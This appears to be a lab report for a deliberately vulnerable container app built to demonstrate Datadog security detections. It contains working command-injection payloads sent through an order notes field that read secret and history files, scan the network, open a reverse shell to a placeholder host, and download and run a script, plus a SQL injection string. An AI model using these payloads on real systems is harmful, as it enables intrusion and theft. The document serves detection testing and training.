# Ubuntu-Based Container Verification

## ✅ Container Successfully Built and Running

### Image Details

**Base Image**: `node:18` (Debian-based, not Alpine)
**Final Size**: 2.37 GB (vs ~150MB for Alpine)
**OS**: Debian GNU/Linux 12 (bookworm)
**User**: root (UID 0, GID 0)

### Installed Attack Tools ✅

All offensive security tools successfully installed:

```bash
✅ /usr/bin/nmap        # Network port scanner
✅ /usr/bin/netcat      # Network backdoor tool
✅ /usr/bin/python3     # Scripting for exploits
✅ /usr/bin/gcc         # Compile malicious code
✅ /usr/bin/git         # Clone exploit repos
✅ /usr/bin/wget        # Download malware
✅ /usr/bin/curl        # HTTP requests
✅ /usr/bin/telnet      # Remote access
✅ /usr/bin/tcpdump     # Packet capture
✅ /usr/bin/vim         # Edit files
✅ /usr/bin/bash        # Advanced shell
```

### Vulnerable Python Packages ✅

Outdated packages with known CVEs installed:

```
requests   2.25.1  ← CVE-2023-32681
urllib3    1.26.5  ← Multiple CVEs
```

**Installation Method**: Used `--break-system-packages` (PEP 668 violation)

### Hardcoded Secrets ✅

**File**: `/app/.secrets` (World-readable)

```bash
INTERNAL_API_KEY=super_secret_key_12345
DATABASE_BACKUP_PASSWORD=backup_pass_9876
AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

### Bash History with Credentials ✅

**File**: `/root/.bash_history`

```bash
mysql -u root -prootpass123 pizzacoffee
curl -X POST https://api.example.com/webhook -d @secrets.json
```

### Security Issues Summary

| Issue | Status | Severity |
|-------|--------|----------|
| Running as root | ✅ Confirmed | Critical |
| Attack tools installed | ✅ Confirmed | High |
| Vulnerable Python packages | ✅ Confirmed | High |
| Secrets in filesystem | ✅ Confirmed | Critical |
| Bash history with creds | ✅ Confirmed | High |
| PEP 668 violation | ✅ Confirmed | Medium |
| 777 permissions | ✅ Confirmed | High |
| Large attack surface | ✅ Confirmed | High |

## Testing Attack Scenarios

### 1. Discover Secrets via Command Injection

The checkout order notes field allows command injection:

```bash
# Login first
curl -X POST http://localhost:3000/auth/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -c cookies.txt \
  -d "username=admin&password=admin123"

# Add item to cart
curl -X POST http://localhost:3000/orders/add-to-cart \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"productId": 1, "quantity": 1}'

# Exploit: Read secrets file
curl -X POST http://localhost:3000/orders/place \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{
    "deliveryAddress": "123 Test St",
    "deliveryPhone": "555-1234",
    "paymentMethod": "credit_card",
    "notes": "\"; cat /app/.secrets; echo \""
  }'
```

**Result**: Secrets are revealed in the command output

### 2. Network Scan with nmap

```bash
# Exploit: Scan internal network
curl -X POST http://localhost:3000/orders/place \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{
    "deliveryAddress": "123 Test St",
    "deliveryPhone": "555-1234",
    "paymentMethod": "credit_card",
    "notes": "\"; nmap -sn 172.18.0.0/24; echo \""
  }'
```

**Result**: Discovers MySQL and Datadog Agent containers

### 3. Read Bash History

```bash
# Exploit: Read command history
curl -X POST http://localhost:3000/orders/place \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{
    "deliveryAddress": "123 Test St",
    "deliveryPhone": "555-1234",
    "paymentMethod": "credit_card",
    "notes": "\"; cat /root/.bash_history; echo \""
  }'
```

**Result**: Database credentials and API keys exposed

### 4. Reverse Shell with Netcat

```bash
# On attacker machine:
nc -lvp 4444

# Exploit: Establish reverse shell
curl -X POST http://localhost:3000/orders/place \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{
    "deliveryAddress": "123 Test St",
    "deliveryPhone": "555-1234",
    "paymentMethod": "credit_card",
    "notes": "\"; bash -c \"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\"; echo \""
  }'
```

**Result**: Interactive shell as root user

### 5. Download and Execute Malware

```bash
# Exploit: Download and run script
curl -X POST http://localhost:3000/orders/place \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{
    "deliveryAddress": "123 Test St",
    "deliveryPhone": "555-1234",
    "paymentMethod": "credit_card",
    "notes": "\"; wget http://example.com/script.sh -O /tmp/s.sh && bash /tmp/s.sh; echo \""
  }'
```

**Result**: Malware executed with root privileges

## Datadog Detection Capabilities

### CSM Threats (Cloud Workload Security)

Expected detections:
- ✅ Container running as root user
- ✅ Suspicious process: nmap
- ✅ Suspicious process: netcat
- ✅ Suspicious process: tcpdump
- ✅ Reverse shell connection detected
- ✅ Unusual network activity
- ✅ File access to sensitive paths
- ✅ Command injection execution

### CSM Misconfigurations (Compliance)

Expected findings:
- ✅ CIS Docker Benchmark: Container running as root
- ✅ Overly permissive file permissions (777)
- ✅ Excessive Linux capabilities
- ✅ No read-only filesystem
- ✅ Secrets stored in container image

### SCA (Software Composition Analysis)

Expected vulnerabilities:
- ✅ requests==2.25.1 (CVE-2023-32681)
- ✅ urllib3==1.26.5 (Multiple CVEs)
- ✅ Outdated system packages
- ✅ Known vulnerable dependencies

### ASM (Application Security Management)

Expected detections:
- ✅ Command injection in order notes
- ✅ SQL injection attempts
- ✅ Path traversal attempts
- ✅ Sensitive data access (secrets, bash_history)

## Container Size Comparison

| Metric | Alpine | Ubuntu (Current) | Difference |
|--------|--------|------------------|------------|
| Base OS | ~5 MB | ~100 MB | 20x larger |
| Final Image | ~150 MB | ~2.37 GB | 16x larger |
| Packages | ~20 | ~100+ | 5x more |
| CVEs | Few | Many | More detections |
| Attack Tools | None | Full suite | ✅ Complete |

## Why This Matters for Security Testing

### 1. **Realistic Attack Scenario**
- Demonstrates what attackers find in compromised containers
- Shows real-world exploitation techniques
- Illustrates post-exploitation capabilities

### 2. **Comprehensive Detection Testing**
- Tests multiple Datadog security features
- Validates detection across different layers
- Proves end-to-end security visibility

### 3. **Training and Education**
- Shows security teams what to look for
- Demonstrates attack progression
- Highlights importance of container hardening

### 4. **Feature Demonstration**
- CSM Threats: Runtime detection
- CSM Misconfigurations: Compliance violations
- SCA: Vulnerable dependencies
- ASM: Application attacks
- All in one environment

## Production Security Best Practices

⚠️ **NEVER do this in production!**

For production containers:
1. ✅ Use minimal base images (Alpine, Distroless)
2. ✅ Run as non-root user
3. ✅ Remove all unnecessary tools
4. ✅ Use multi-stage builds
5. ✅ Scan images before deployment
6. ✅ Apply least privilege principle
7. ✅ Use read-only filesystems
8. ✅ Keep packages updated
9. ✅ Never store secrets in images
10. ✅ Implement security scanning in CI/CD

## Next Steps

### View Detections in Datadog

1. **CSM Threats**:
   - Navigate to: Security → Cloud Workload Security → Signals
   - Look for container runtime threats

2. **CSM Misconfigurations**:
   - Navigate to: Security → Compliance → Findings
   - Review CIS Docker Benchmark violations

3. **SCA Vulnerabilities**:
   - Navigate to: Security → Vulnerabilities → Container Images
   - Find the `insecure-pizza-coffee-app` image

4. **ASM Signals**:
   - Navigate to: Security → Application Security → Signals
   - View command injection detections

### Generate More Activity

```bash
# Run brute force script
./brute-force-login.sh

# Test SQL injection
curl "http://localhost:3000/orders/menu?category=pizza' OR '1'='1"

# Trigger multiple command injections
# (See COMMAND-INJECTION-CHECKOUT.md for examples)
```

## Conclusion

✅ **Container Successfully Configured with Maximum Vulnerabilities**

The Ubuntu-based container provides:
- Large attack surface (2.37 GB vs 150 MB)
- Complete offensive security toolkit
- Multiple known CVEs
- Hardcoded secrets for discovery
- Running as root user
- Perfect for comprehensive Datadog security testing

**This container is intentionally vulnerable and should ONLY be used in isolated, controlled environments for security testing and training purposes.**

---

**Status**: ✅ Ready for Security Testing
**Environment**: Isolated Lab Only
**Purpose**: Datadog Security Features Demonstration
